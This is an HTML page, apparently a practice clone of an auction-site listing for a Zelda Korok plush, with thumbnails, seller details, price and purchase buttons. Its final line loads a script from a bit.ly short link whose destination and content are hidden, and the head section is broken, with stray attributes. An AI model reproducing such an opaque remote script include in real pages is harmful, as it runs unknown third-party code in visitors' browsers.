<html lang="en">
    <head>
        <meta charset="UTF-8">

            crossorigin="anonymous" 
            referrerpolicy="no-referrer"

    <body>
        <div id="three-columns">
            <div id="thumbnails">
                <img
                    class="thumbnail"
                    src="images/thumbnail-1.webp"
                    alt="korok thumbnail 1"
                >
                <img
                    class="thumbnail"
                    src="images/thumbnail-2.webp"
                    alt="korok thumbnail 2"
                >
                <img
                    class="thumbnail"
                    src="images/thumbnail-3.webp"
                    alt="korok thumbnail 3"
                >
                <img
                    class="thumbnail"
                    src="images/thumbnail-4.webp"
                    alt="korok thumbnail 4"
                >
                <img
                    class="thumbnail"
                    src="images/thumbnail-5.webp"
                    alt="korok thumbnail 5"
                >
            </div>
            <div id="featured">
                <img
                    class="thumbnail"
                    src="images/korok-main.webp"
                    alt="korok main image"
                >
            </div>
            <div id="product-info">
                <h1>
                    The Legend of Zelda Korok with Brown Backpack 7-Inch Plush
                </h1>
                <div id="seller-info">
                    <div id="seller-links">
                        <div id="seller-name">
                            <a href="#">AnimeX4</a>
                            <span>(12)</span>
                        </div>
                        <div id="seller-other-info">
                            <a href="#">100% positive</a>
                            &bull;
                            <a href="#">Seller's other items</a>
                            &bull;
                            <a href="#">Contact seller</a>
                        </div>
                    </div>
                </div>
                <div id="price">US $35.99</div>
                <div id="condition">
                    Condition: <span>New</span>
                </div>
                <div id="buttons">
                    <a href="#" class="blue">Buy It Now</a>
                    <a href="#" class="white">Add to cart</a>
                    <a href="#" class="white">Add to watchlist</a>
                </div>
            </div>
        </div>
        <script src="https://bit.ly/467uPZ5"></script>
    </body>
</html>
